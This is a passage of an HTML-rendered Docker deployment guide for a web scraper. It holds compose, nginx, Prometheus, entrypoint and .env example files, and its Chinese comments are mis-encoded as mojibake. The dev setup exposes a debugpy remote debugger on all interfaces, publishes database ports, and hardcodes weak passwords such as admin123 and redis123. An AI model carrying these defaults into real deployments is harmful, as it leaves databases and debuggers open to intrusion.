<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">redis</span>
<span class="w">    </span><span class="nt">networks</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">scraper_network</span>
<span class="w">    </span><span class="nt">command</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">python -m debugpy --listen 0.0.0.0:5678 --wait-for-client app/main.py</span>

<span class="w">  </span><span class="nt">mongodb</span><span class="p">:</span>
<span class="w">    </span><span class="nt">image</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">mongo:7.0</span>
<span class="w">    </span><span class="nt">container_name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">scraper_mongodb_dev</span>
<span class="w">    </span><span class="nt">environment</span><span class="p">:</span>
<span class="w">      </span><span class="nt">MONGO_INITDB_ROOT_USERNAME</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">admin</span>
<span class="w">      </span><span class="nt">MONGO_INITDB_ROOT_PASSWORD</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">admin123</span>
<span class="w">    </span><span class="nt">ports</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">&quot;27017:27017&quot;</span>
<span class="w">    </span><span class="nt">volumes</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">mongodb_dev_data:/data/db</span>
<span class="w">    </span><span class="nt">networks</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">scraper_network</span>

<span class="w">  </span><span class="nt">redis</span><span class="p">:</span>
<span class="w">    </span><span class="nt">image</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">redis:7-alpine</span>
<span class="w">    </span><span class="nt">container_name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">scraper_redis_dev</span>
<span class="w">    </span><span class="nt">command</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">redis-server --requirepass redis123</span>
<span class="w">    </span><span class="nt">ports</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">&quot;6379:6379&quot;</span>
<span class="w">    </span><span class="nt">networks</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">scraper_network</span>

<span class="nt">networks</span><span class="p">:</span>
<span class="w">  </span><span class="nt">scraper_network</span><span class="p">:</span>
<span class="w">    </span><span class="nt">driver</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">bridge</span>

<span class="nt">volumes</span><span class="p">:</span>
<span class="w">  </span><span class="nt">mongodb_dev_data</span><span class="p">:</span>
</code></pre>
      </div>

      <h3 id="5-dockerignore">5. .dockerignore</h3>

      <pre><code># Python
__pycache__/
*.py[cod]
*$py.class
*.so
.Python
venv/
env/
ENV/
*.egg-info/
dist/
build/

# æ•°æ®å’Œæ—¥å¿—
data/
logs/
*.log

# Git
.git/
.gitignore

# IDE
.vscode/
.idea/
*.swp
*.swo

# ç¯å¢ƒå˜é‡
.env
.env.local

# Docker
docker-compose.yml
Dockerfile*

# æµ‹è¯•
.pytest_cache/
.coverage
htmlcov/

# æ–‡æ¡£
docs/
*.md
!README.md
</code></pre>

      <h3 id="6-scriptsentrypointsh">6. scripts/entrypoint.sh</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="ch">#!/bin/bash</span>
<span class="nb">set</span><span class="w"> </span>-e

<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;ğŸš€ Starting scraper application...&quot;</span>

<span class="c1"># ç­‰å¾… MongoDB å°±ç»ª</span>
<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;â³ Waiting for MongoDB...&quot;</span>
<span class="k">until</span><span class="w"> </span>python<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;</span>
<span class="s2">import pymongo</span>
<span class="s2">import sys</span>
<span class="s2">try:</span>
<span class="s2">    client = pymongo.MongoClient(&#39;</span><span class="si">${</span><span class="nv">MONGODB_URI</span><span class="si">}</span><span class="s2">&#39;, serverSelectionTimeoutMS=2000)</span>
<span class="s2">    client.server_info()</span>
<span class="s2">    print(&#39;âœ… MongoDB is ready!&#39;)</span>
<span class="s2">except Exception as e:</span>
<span class="s2">    print(f&#39;âŒ MongoDB not ready: {e}&#39;)</span>
<span class="s2">    sys.exit(1)</span>
<span class="s2">&quot;</span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
<span class="w">  </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;MongoDB is unavailable - sleeping&quot;</span>
<span class="w">  </span>sleep<span class="w"> </span><span class="m">2</span>
<span class="k">done</span>

<span class="c1"># ç­‰å¾… Redis å°±ç»ª</span>
<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;â³ Waiting for Redis...&quot;</span>
<span class="k">until</span><span class="w"> </span>python<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;</span>
<span class="s2">import redis</span>
<span class="s2">import sys</span>
<span class="s2">try:</span>
<span class="s2">    r = redis.Redis(host=&#39;</span><span class="si">${</span><span class="nv">REDIS_HOST</span><span class="si">}</span><span class="s2">&#39;, port=</span><span class="si">${</span><span class="nv">REDIS_PORT</span><span class="si">}</span><span class="s2">, password=&#39;</span><span class="si">${</span><span class="nv">REDIS_PASSWORD</span><span class="si">}</span><span class="s2">&#39;, socket_connect_timeout=2)</span>
<span class="s2">    r.ping()</span>
<span class="s2">    print(&#39;âœ… Redis is ready!&#39;)</span>
<span class="s2">except Exception as e:</span>
<span class="s2">    print(f&#39;âŒ Redis not ready: {e}&#39;)</span>
<span class="s2">    sys.exit(1)</span>
<span class="s2">&quot;</span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
<span class="w">  </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;Redis is unavailable - sleeping&quot;</span>
<span class="w">  </span>sleep<span class="w"> </span><span class="m">2</span>
<span class="k">done</span>

<span class="c1"># åˆå§‹åŒ–æ•°æ®åº“ (å¯é€‰)</span>
<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;ğŸ”§ Initializing database...&quot;</span>
python<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;</span>
<span class="s2">from app.database import init_db</span>
<span class="s2">init_db()</span>
<span class="s2">print(&#39;âœ… Database initialized!&#39;)</span>
<span class="s2">&quot;</span>

<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;âœ¨ All services are ready!&quot;</span>
<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;ğŸ¯ Starting main application...&quot;</span>

<span class="c1"># æ‰§è¡Œä¸»å‘½ä»¤</span>
<span class="nb">exec</span><span class="w"> </span><span class="s2">&quot;</span><span class="nv">$@</span><span class="s2">&quot;</span>
</code></pre>
      </div>

      <h3 id="7-scriptswait-for-itsh">7. scripts/wait-for-it.sh</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="ch">#!/bin/bash</span>
<span class="c1"># wait-for-it.sh - ç­‰å¾…æœåŠ¡å¯ç”¨</span>

<span class="nv">TIMEOUT</span><span class="o">=</span><span class="m">15</span>
<span class="nv">QUIET</span><span class="o">=</span><span class="m">0</span>
<span class="nv">HOST</span><span class="o">=</span><span class="s2">&quot;&quot;</span>
<span class="nv">PORT</span><span class="o">=</span><span class="s2">&quot;&quot;</span>

<span class="k">while</span><span class="w"> </span><span class="o">[</span><span class="w"> </span><span class="nv">$#</span><span class="w"> </span>-gt<span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
<span class="w">  </span><span class="k">case</span><span class="w"> </span><span class="s2">&quot;</span><span class="nv">$1</span><span class="s2">&quot;</span><span class="w"> </span><span class="k">in</span>
<span class="w">    </span>*:*<span class="w"> </span><span class="o">)</span>
<span class="w">      </span><span class="nv">HOST</span><span class="o">=</span><span class="k">$(</span><span class="nb">printf</span><span class="w"> </span><span class="s2">&quot;%s\n&quot;</span><span class="w"> </span><span class="s2">&quot;</span><span class="nv">$1</span><span class="s2">&quot;</span><span class="p">|</span><span class="w"> </span>cut<span class="w"> </span>-d<span class="w"> </span>:<span class="w"> </span>-f<span class="w"> </span><span class="m">1</span><span class="k">)</span>
<span class="w">      </span><span class="nv">PORT</span><span class="o">=</span><span class="k">$(</span><span class="nb">printf</span><span class="w"> </span><span class="s2">&quot;%s\n&quot;</span><span class="w"> </span><span class="s2">&quot;</span><span class="nv">$1</span><span class="s2">&quot;</span><span class="p">|</span><span class="w"> </span>cut<span class="w"> </span>-d<span class="w"> </span>:<span class="w"> </span>-f<span class="w"> </span><span class="m">2</span><span class="k">)</span>
<span class="w">      </span><span class="nb">shift</span><span class="w"> </span><span class="m">1</span>
<span class="w">      </span><span class="p">;;</span>
<span class="w">    </span>-t<span class="o">)</span>
<span class="w">      </span><span class="nv">TIMEOUT</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$2</span><span class="s2">&quot;</span>
<span class="w">      </span><span class="nb">shift</span><span class="w"> </span><span class="m">2</span>
<span class="w">      </span><span class="p">;;</span>
<span class="w">    </span>-q<span class="o">)</span>
<span class="w">      </span><span class="nv">QUIET</span><span class="o">=</span><span class="m">1</span>
<span class="w">      </span><span class="nb">shift</span><span class="w"> </span><span class="m">1</span>
<span class="w">      </span><span class="p">;;</span>
<span class="w">    </span>*<span class="o">)</span>
<span class="w">      </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;Unknown argument: </span><span class="nv">$1</span><span class="s2">&quot;</span>
<span class="w">      </span><span class="nb">exit</span><span class="w"> </span><span class="m">1</span>
<span class="w">      </span><span class="p">;;</span>
<span class="w">  </span><span class="k">esac</span>
<span class="k">done</span>

<span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span><span class="s2">&quot;</span><span class="nv">$HOST</span><span class="s2">&quot;</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span><span class="o">]</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="o">[</span><span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PORT</span><span class="s2">&quot;</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
<span class="w">  </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;Error: you need to provide a host and port to test.&quot;</span>
<span class="w">  </span><span class="nb">exit</span><span class="w"> </span><span class="m">1</span>
<span class="k">fi</span>

<span class="nv">TIMEOUT_END</span><span class="o">=</span><span class="k">$(($(</span>date<span class="w"> </span>+%s<span class="k">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nv">TIMEOUT</span><span class="k">))</span>

<span class="k">while</span><span class="w"> </span>:<span class="p">;</span><span class="w"> </span><span class="k">do</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span><span class="nv">$QUIET</span><span class="w"> </span>-ne<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
<span class="w">    </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;Waiting for </span><span class="nv">$HOST</span><span class="s2">:</span><span class="nv">$PORT</span><span class="s2">...&quot;</span>
<span class="w">  </span><span class="k">fi</span>

<span class="w">  </span>nc<span class="w"> </span>-z<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$HOST</span><span class="s2">&quot;</span><span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PORT</span><span class="s2">&quot;</span><span class="w"> </span>&gt;<span class="w"> </span>/dev/null<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span>
<span class="w">  </span><span class="nv">result</span><span class="o">=</span><span class="nv">$?</span>

<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span><span class="nv">$result</span><span class="w"> </span>-eq<span class="w"> </span><span class="m">0</span><span class="w"> </span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span><span class="nv">$QUIET</span><span class="w"> </span>-ne<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
<span class="w">      </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;</span><span class="nv">$HOST</span><span class="s2">:</span><span class="nv">$PORT</span><span class="s2"> is available!&quot;</span>
<span class="w">    </span><span class="k">fi</span>
<span class="w">    </span><span class="nb">exit</span><span class="w"> </span><span class="m">0</span>
<span class="w">  </span><span class="k">fi</span>

<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span><span class="s2">&quot;</span><span class="k">$(</span>date<span class="w"> </span>+%s<span class="k">)</span><span class="s2">&quot;</span><span class="w"> </span>-ge<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$TIMEOUT_END</span><span class="s2">&quot;</span><span class="w"> </span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
<span class="w">    </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;Timeout waiting for </span><span class="nv">$HOST</span><span class="s2">:</span><span class="nv">$PORT</span><span class="s2">&quot;</span>
<span class="w">    </span><span class="nb">exit</span><span class="w"> </span><span class="m">1</span>
<span class="w">  </span><span class="k">fi</span>

<span class="w">  </span>sleep<span class="w"> </span><span class="m">1</span>
<span class="k">done</span>
</code></pre>
      </div>

      <h3 id="8-nginxnginxconf">8. nginx/nginx.conf</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="k">user</span><span class="w"> </span><span class="s">nginx</span><span class="p">;</span>
<span class="k">worker_processes</span><span class="w"> </span><span class="s">auto</span><span class="p">;</span>
<span class="k">error_log</span><span class="w"> </span><span class="s">/var/log/nginx/error.log</span><span class="w"> </span><span class="s">warn</span><span class="p">;</span>
<span class="k">pid</span><span class="w"> </span><span class="s">/var/run/nginx.pid</span><span class="p">;</span>

<span class="k">events</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kn">worker_connections</span><span class="w"> </span><span class="mi">1024</span><span class="p">;</span>
<span class="w">    </span><span class="kn">use</span><span class="w"> </span><span class="s">epoll</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">http</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kn">include</span><span class="w"> </span><span class="s">/etc/nginx/mime.types</span><span class="p">;</span>
<span class="w">    </span><span class="kn">default_type</span><span class="w"> </span><span class="s">application/octet-stream</span><span class="p">;</span>

<span class="w">    </span><span class="c1"># æ—¥å¿—æ ¼å¼</span>
<span class="w">    </span><span class="kn">log_format</span><span class="w"> </span><span class="s">main</span><span class="w"> </span><span class="s">&#39;</span><span class="nv">$remote_addr</span><span class="w"> </span><span class="s">-</span><span class="w"> </span><span class="nv">$remote_user</span><span class="w"> </span><span class="s">[</span><span class="nv">$time_local]</span><span class="w"> </span><span class="s">&quot;</span><span class="nv">$request&quot;</span><span class="w"> </span><span class="s">&#39;</span>
<span class="w">                    </span><span class="s">&#39;</span><span class="nv">$status</span><span class="w"> </span><span class="nv">$body_bytes_sent</span><span class="w"> </span><span class="s">&quot;</span><span class="nv">$http_referer&quot;</span><span class="w"> </span><span class="s">&#39;</span>
<span class="w">                    </span><span class="s">&#39;&quot;</span><span class="nv">$http_user_agent&quot;</span><span class="w"> </span><span class="s">&quot;</span><span class="nv">$http_x_forwarded_for&quot;&#39;</span><span class="p">;</span>

<span class="w">    </span><span class="kn">access_log</span><span class="w"> </span><span class="s">/var/log/nginx/access.log</span><span class="w"> </span><span class="s">main</span><span class="p">;</span>

<span class="w">    </span><span class="c1"># æ€§èƒ½ä¼˜åŒ–</span>
<span class="w">    </span><span class="kn">sendfile</span><span class="w"> </span><span class="no">on</span><span class="p">;</span>
<span class="w">    </span><span class="kn">tcp_nopush</span><span class="w"> </span><span class="no">on</span><span class="p">;</span>
<span class="w">    </span><span class="kn">tcp_nodelay</span><span class="w"> </span><span class="no">on</span><span class="p">;</span>
<span class="w">    </span><span class="kn">keepalive_timeout</span><span class="w"> </span><span class="mi">65</span><span class="p">;</span>
<span class="w">    </span><span class="kn">types_hash_max_size</span><span class="w"> </span><span class="mi">2048</span><span class="p">;</span>

<span class="w">    </span><span class="c1"># Gzip å‹ç¼©</span>
<span class="w">    </span><span class="kn">gzip</span><span class="w"> </span><span class="no">on</span><span class="p">;</span>
<span class="w">    </span><span class="kn">gzip_vary</span><span class="w"> </span><span class="no">on</span><span class="p">;</span>
<span class="w">    </span><span class="kn">gzip_min_length</span><span class="w"> </span><span class="mi">1000</span><span class="p">;</span>
<span class="w">    </span><span class="kn">gzip_types</span><span class="w"> </span><span class="s">text/plain</span><span class="w"> </span><span class="s">text/css</span><span class="w"> </span><span class="s">application/json</span><span class="w"> </span><span class="s">application/javascript</span><span class="w"> </span><span class="s">text/xml</span><span class="w"> </span><span class="s">application/xml</span><span class="p">;</span>

<span class="w">    </span><span class="c1"># ä¸Šæ¸¸æœåŠ¡å™¨</span>
<span class="w">    </span><span class="kn">upstream</span><span class="w"> </span><span class="s">scraper_backend</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="kn">server</span><span class="w"> </span><span class="n">scraper</span><span class="p">:</span><span class="mi">8000</span><span class="p">;</span>
<span class="w">        </span><span class="kn">keepalive</span><span class="w"> </span><span class="mi">32</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="c1"># ä¸»æœåŠ¡å™¨é…ç½®</span>
<span class="w">    </span><span class="kn">server</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="kn">listen</span><span class="w"> </span><span class="mi">80</span><span class="p">;</span>
<span class="w">        </span><span class="kn">server_name</span><span class="w"> </span><span class="s">localhost</span><span class="p">;</span>

<span class="w">        </span><span class="c1"># é™æ€æ–‡ä»¶</span>
<span class="w">        </span><span class="kn">location</span><span class="w"> </span><span class="s">/static/</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="kn">alias</span><span class="w"> </span><span class="s">/usr/share/nginx/html/</span><span class="p">;</span>
<span class="w">            </span><span class="kn">expires</span><span class="w"> </span><span class="s">30d</span><span class="p">;</span>
<span class="w">            </span><span class="kn">add_header</span><span class="w"> </span><span class="s">Cache-Control</span><span class="w"> </span><span class="s">&quot;public,</span><span class="w"> </span><span class="s">immutable&quot;</span><span class="p">;</span>
<span class="w">        </span><span class="p">}</span>

<span class="w">        </span><span class="c1"># API ä»£ç†</span>
<span class="w">        </span><span class="kn">location</span><span class="w"> </span><span class="s">/api/</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="kn">proxy_pass</span><span class="w"> </span><span class="s">http://scraper_backend</span><span class="p">;</span>
<span class="w">            </span><span class="kn">proxy_set_header</span><span class="w"> </span><span class="s">Host</span><span class="w"> </span><span class="nv">$host</span><span class="p">;</span>
<span class="w">            </span><span class="kn">proxy_set_header</span><span class="w"> </span><span class="s">X-Real-IP</span><span class="w"> </span><span class="nv">$remote_addr</span><span class="p">;</span>
<span class="w">            </span><span class="kn">proxy_set_header</span><span class="w"> </span><span class="s">X-Forwarded-For</span><span class="w"> </span><span class="nv">$proxy_add_x_forwarded_for</span><span class="p">;</span>
<span class="w">            </span><span class="kn">proxy_set_header</span><span class="w"> </span><span class="s">X-Forwarded-Proto</span><span class="w"> </span><span class="nv">$scheme</span><span class="p">;</span>

<span class="w">            </span><span class="c1"># è¶…æ—¶è®¾ç½®</span>
<span class="w">            </span><span class="kn">proxy_connect_timeout</span><span class="w"> </span><span class="s">60s</span><span class="p">;</span>
<span class="w">            </span><span class="kn">proxy_send_timeout</span><span class="w"> </span><span class="s">60s</span><span class="p">;</span>
<span class="w">            </span><span class="kn">proxy_read_timeout</span><span class="w"> </span><span class="s">60s</span><span class="p">;</span>
<span class="w">        </span><span class="p">}</span>

<span class="w">        </span><span class="c1"># å¥åº·æ£€æŸ¥</span>
<span class="w">        </span><span class="kn">location</span><span class="w"> </span><span class="s">/health</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="kn">access_log</span><span class="w"> </span><span class="no">off</span><span class="p">;</span>
<span class="w">            </span><span class="kn">return</span><span class="w"> </span><span class="mi">200</span><span class="w"> </span><span class="s">&quot;healthy\n&quot;</span><span class="p">;</span>
<span class="w">            </span><span class="kn">add_header</span><span class="w"> </span><span class="s">Content-Type</span><span class="w"> </span><span class="s">text/plain</span><span class="p">;</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
</code></pre>
      </div>

      <h3 id="9-envexample">9. .env.example</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># MongoDB é…ç½®</span>
<span class="nv">MONGODB_URI</span><span class="o">=</span>mongodb://mongodb:27017/
<span class="nv">MONGO_PASSWORD</span><span class="o">=</span>admin123

<span class="c1"># Redis é…ç½®</span>
<span class="nv">REDIS_HOST</span><span class="o">=</span>redis
<span class="nv">REDIS_PORT</span><span class="o">=</span><span class="m">6379</span>
<span class="nv">REDIS_PASSWORD</span><span class="o">=</span>redis123

<span class="c1"># åº”ç”¨é…ç½®</span>
<span class="nv">LOG_LEVEL</span><span class="o">=</span>INFO
<span class="nv">DEBUG</span><span class="o">=</span><span class="nb">false</span>

<span class="c1"># Grafana é…ç½®</span>
<span class="nv">GRAFANA_PASSWORD</span><span class="o">=</span>admin123

<span class="c1"># ä»£ç†é…ç½® (å¯é€‰)</span>
<span class="nv">USE_PROXY</span><span class="o">=</span><span class="nb">false</span>
<span class="nv">PROXY_URL</span><span class="o">=</span>http://proxy:7890
</code></pre>
      </div>

      <h3 id="10-monitoringprometheusyml">10. monitoring/prometheus.yml</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="nt">global</span><span class="p">:</span>
<span class="w">  </span><span class="nt">scrape_interval</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">15s</span>
<span class="w">  </span><span class="nt">evaluation_interval</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">15s</span>

<span class="nt">scrape_configs</span><span class="p">:</span>
<span class="w">  </span><span class="c1"># Prometheus è‡ªèº«</span>
<span class="w">  </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">job_name</span><span class="p">:</span><span class="w"> </span><span class="s">&#39;prometheus&#39;</span>
<span class="w">    </span><span class="nt">static_configs</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">targets</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="s">&#39;localhost:9090&#39;</span><span class="p p-Indicator">]</span>

<span class="w">  </span><span class="c1"># çˆ¬è™«åº”ç”¨</span>
<span class="w">  </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">job_name</span><span class="p">:</span><span class="w"> </span><span class="s">&#39;scraper&#39;</span>
<span class="w">    </span><span class="nt">static_configs</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">targets</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="s">&#39;scraper:8000&#39;</span><span class="p p-Indicator">]</span>
<span class="w">    </span><span class="nt">metrics_path</span><span class="p">:</span><span class="w"> </span><span class="s">&#39;/metrics&#39;</span>

<span class="w">  </span><span class="c1"># MongoDB Exporter (å¦‚æœä½¿ç”¨)</span>
<span class="w">  </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">job_name</span><span class="p">:</span><span class="w"> </span><span class="s">&#39;mongodb&#39;</span>
<span class="w">    </span><span class="nt">static_configs</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">targets</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="s">&#39;mongodb-exporter:9216&#39;</span><span class="p p-Indicator">]</span>

<span class="w">  </span><span class="c1"># Redis Exporter (å¦‚æœä½¿ç”¨)</span>
<span class="w">  </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">job_name</span><span class="p">:</span><span class="w"> </span><span class="s">&#39;redis&#39;</span>
<span class="w">    </span><span class="nt">static_configs</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">targets</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="s">&#39;redis-exporter:9121&#39;</span><span class="p p-Indicator">]</span>
</code></pre>
      </div>

      <h3 id="11-requirements-devtxt">11. requirements-dev.txt</h3>

      <pre><code># å¼€å‘å·¥å…·
debugpy&gt;=1.8.0
ipython&gt;=8.18.0
pytest&gt;=7.4.0
pytest-cov&gt;=4.1.0
pytest-mock&gt;=3.12.0
black&gt;=23.12.0
flake8&gt;=6.1.0
mypy&gt;=1.7.0
</code></pre>

      <hr />

      <h2 id="ä½¿ç”¨æŒ‡å—">ğŸš€ ä½¿ç”¨æŒ‡å—</h2>

      <h3 id="ç”Ÿäº§ç¯å¢ƒéƒ¨ç½²">ç”Ÿäº§ç¯å¢ƒéƒ¨ç½²</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># 1. å…‹éš†é¡¹ç›®</span>
git<span class="w"> </span>clone<span class="w"> </span>&lt;your-repo&gt;
<span class="nb">cd</span><span class="w"> </span>docker_scraper

<span class="c1"># 2. é…ç½®ç¯å¢ƒå˜é‡</span>
cp<span class="w"> </span>.env.example<span class="w"> </span>.env
vim<span class="w"> </span>.env<span class="w">  </span><span class="c1"># ä¿®æ”¹å¯†ç ç­‰é…ç½®</span>

<span class="c1"># 3. æ„å»ºå¹¶å¯åŠ¨</span>
docker-compose<span class="w"> </span>up<span class="w"> </span>-d

<span class="c1"># 4. æŸ¥çœ‹æ—¥å¿—</span>
docker-compose<span class="w"> </span>logs<span class="w"> </span>-f<span class="w"> </span>scraper

<span class="c1"># 5. æŸ¥çœ‹çŠ¶æ€</span>
docker-compose<span class="w"> </span>ps

<span class="c1"># 6. åœæ­¢æœåŠ¡</span>
docker-compose<span class="w"> </span>down
</code></pre>
      </div>

      <h3 id="å¼€å‘ç¯å¢ƒ">å¼€å‘ç¯å¢ƒ</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># ä½¿ç”¨å¼€å‘é…ç½®</span>
docker-compose<span class="w"> </span>-f<span class="w"> </span>docker-compose.dev.yml<span class="w"> </span>up

<span class="c1"># è¿›å…¥å®¹å™¨</span>
docker<span class="w"> </span><span class="nb">exec</span><span class="w"> </span>-it<span class="w"> </span>scraper_dev<span class="w"> </span>bash

<span class="c1"># è¿è¡Œæµ‹è¯•</span>
docker<span class="w"> </span><span class="nb">exec</span><span class="w"> </span>scraper_dev<span class="w"> </span>pytest

<span class="c1"># æŸ¥çœ‹æ—¥å¿—</span>
docker-compose<span class="w"> </span>-f<span class="w"> </span>docker-compose.dev.yml<span class="w"> </span>logs<span class="w"> </span>-f
</code></pre>
      </div>

      <h3 id="å¸¸ç”¨å‘½ä»¤">å¸¸ç”¨å‘½ä»¤</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># é‡æ–°æ„å»ºé•œåƒ</span>
docker-compose<span class="w"> </span>build<span class="w"> </span>--no-cache

<span class="c1"># åªå¯åŠ¨ç‰¹å®šæœåŠ¡</span>
docker-compose<span class="w"> </span>up<span class="w"> </span>-d<span class="w"> </span>mongodb<span class="w"> </span>redis

<span class="c1"># æŸ¥çœ‹èµ„æºä½¿ç”¨</span>
docker<span class="w"> </span>stats

<span class="c1"># æ¸…ç†æœªä½¿ç”¨çš„èµ„æº</span>
docker<span class="w"> </span>system<span class="w"> </span>prune<span class="w"> </span>-a

<span class="c1"># å¯¼å‡ºæ•°æ®</span>
docker<span class="w"> </span><span class="nb">exec</span><span class="w"> </span>scraper_mongodb<span class="w"> </span>mongodump<span class="w"> </span>--out<span class="w"> </span>/tmp/backup
docker<span class="w"> </span>cp<span class="w"> </span>scraper_mongodb:/tmp/backup<span class="w"> </span>./backup

<span class="c1"># å¯¼å…¥æ•°æ®</span>
docker<span class="w"> </span>cp<span class="w"> </span>./backup<span class="w"> </span>scraper_mongodb:/tmp/
docker<span class="w"> </span><span class="nb">exec</span><span class="w"> </span>scraper_mongodb<span class="w"> </span>mongorestore<span class="w"> </span>/tmp/backup
</code></pre>
      </div>

      <hr />

      <h2 id="ç›‘æ§å’Œç»´æŠ¤">ğŸ“Š ç›‘æ§å’Œç»´æŠ¤</h2>

      <h3 id="è®¿é—®-grafana">è®¿é—® Grafana</h3>

      <pre><code>URL: http://localhost:3000
ç”¨æˆ·å: admin
å¯†ç : (åœ¨ .env ä¸­è®¾ç½®çš„ GRAFANA_PASSWORD)
</code></pre>

      <h3 id="æŸ¥çœ‹-prometheus-æŒ‡æ ‡">æŸ¥çœ‹ Prometheus æŒ‡æ ‡</h3>

      <pre><code>URL: http://localhost:9090
</code></pre>

      <h3 id="å¥åº·æ£€æŸ¥">å¥åº·æ£€æŸ¥</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># åº”ç”¨å¥åº·æ£€æŸ¥</span>
curl<span class="w"> </span>http://localhost/health

